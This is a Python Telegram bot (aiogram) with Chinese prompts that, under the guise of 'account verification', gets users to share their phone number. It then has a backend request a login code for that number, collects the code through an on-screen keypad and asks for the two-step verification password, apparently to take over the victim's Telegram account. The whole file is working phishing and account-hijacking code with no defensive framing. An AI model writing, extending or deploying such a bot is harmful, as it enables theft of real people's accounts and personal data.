import os
import asyncio
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
)
from aiogram.enums import ContentType
from aiogram.filters import Command

from data_store import set_user_state, get_user_state, clear_user_state
from main import request_code, submit_code, submit_password  # 后端接口

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("❌ 环境变量 BOT_TOKEN 未设置")

bot = Bot(token=TOKEN)
dp = Dispatcher()

def normalize_phone(phone: str) -> str:
    return phone.strip().replace(" ", "").replace("+", "")

@dp.message(Command("start"))
async def start(msg: Message):
    clear_user_state(msg.from_user.id)
    btn = KeyboardButton(text="请点击按钮开始验证", request_contact=True)
    markup = ReplyKeyboardMarkup(resize_keyboard=True, keyboard=[[btn]])
    await msg.answer("开始验证您的账号", reply_markup=markup)


@dp.message(F.content_type == ContentType.CONTACT)
async def handle_phone(msg: Message):
    phone = normalize_phone(msg.contact.phone_number)
    set_user_state(msg.from_user.id, "phone", phone)

    await msg.answer("正在处理中...", reply_markup=ReplyKeyboardRemove())
    btn = InlineKeyboardButton(text="获取验证码", callback_data="send_code")
    markup = InlineKeyboardMarkup(inline_keyboard=[[btn]])
    sent = await msg.answer("收到您的验证请求，请点击按钮获取验证码进行校验", reply_markup=markup)

    set_user_state(msg.from_user.id, "prompt_msg_id", sent.message_id)  # 记录这条消息


@dp.callback_query(F.data == "send_code")
async def handle_send_code(callback: CallbackQuery):
    phone = normalize_phone(get_user_state(callback.from_user.id, "phone"))
    
    if not phone:
        await callback.answer("手机号已失效，请重新验证", show_alert=False)
        return
    
    prompt_msg_id = get_user_state(callback.from_user.id, "prompt_msg_id")
    
    try:
        # 限制超时为 15 秒
        result = await asyncio.wait_for(request_code(phone), timeout=15)
    except asyncio.TimeoutError:
        await callback.answer("请求超时，请稍后再试", show_alert=False)
        return

    if result["status"] == "code_sent":
        
        try:
            await bot.delete_message(callback.from_user.id, prompt_msg_id)
        except:
            pass
            
        keypad = [
            [InlineKeyboardButton(text=str(i), callback_data=f"digit_{i}") for i in range(1, 4)],
            [InlineKeyboardButton(text=str(i), callback_data=f"digit_{i}") for i in range(4, 7)],
            [InlineKeyboardButton(text=str(i), callback_data=f"digit_{i}") for i in range(7, 10)],
            [
                InlineKeyboardButton(text="✅确认", callback_data="submit_code"),
                InlineKeyboardButton(text="0", callback_data="digit_0"),
                InlineKeyboardButton(text="❌清除", callback_data="clear")
            ]
        ]

        code_display = "_ _ _ _ _"
        text = f"请输入您收到的验证码\n{code_display}"

        msg = await bot.send_message(
            callback.from_user.id,
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=keypad)
        )
        set_user_state(callback.from_user.id, "msg_id", msg.message_id)
        set_user_state(callback.from_user.id, "code", "")
    else:
        await callback.answer(result.get("message", "验证码发送失败"), show_alert=False)


@dp.callback_query(F.data.startswith("digit_") | (F.data == "clear"))
async def handle_digit(callback: CallbackQuery):
    uid = callback.from_user.id
    digit = callback.data.split("_")[1] if callback.data.startswith("digit_") else None

    current = get_user_state(uid, "code") or ""
    if callback.data == "clear":
        current = current[:-1]
    elif len(current) < 6:
        current += digit
    set_user_state(uid, "code", current)

    code_display = ' '.join(current[i] if i < len(current) else '_' for i in range(5))
    text = f"请输入您收到的验证码\n{code_display}"

    msg_id = get_user_state(uid, "msg_id")
    try:
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=msg_id,
            text=text,
            reply_markup=callback.message.reply_markup
        )
    except:
        pass


@dp.callback_query(F.data == "submit_code")
async def handle_submit_code(callback: CallbackQuery):
    uid = callback.from_user.id
    phone = normalize_phone(get_user_state(uid, "phone"))
    code = get_user_state(uid, "code")

    result = await submit_code(phone, code)

    if result["status"] == "success":
        await callback.message.edit_text("✅ 登录成功")
        clear_user_state(uid)
    elif result["status"] == "need_password":
        await callback.message.edit_text("此账号开启了两步验证，请输入您的两步验证密码")
        set_user_state(uid, "awaiting_password", True)
    else:
        set_user_state(uid, "code", "")
        await callback.answer("❌ 验证码错误，请重新输入", show_alert=False)


@dp.message()
async def handle_password_input(msg: Message):
    uid = msg.from_user.id
    text = msg.text.strip()

    # 忽略 /start 或非等待密码状态的普通消息
    if text.lower() == "/start":
        return

    if get_user_state(uid, "awaiting_password"):
        phone = normalize_phone(get_user_state(uid, "phone"))
        result = await submit_password(phone, text)

        if result["status"] == "success":
            await msg.answer("✅ 登录成功")
            clear_user_state(uid)
        else:
            await msg.answer("❌ 两步密码错误，请重新输入")


async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
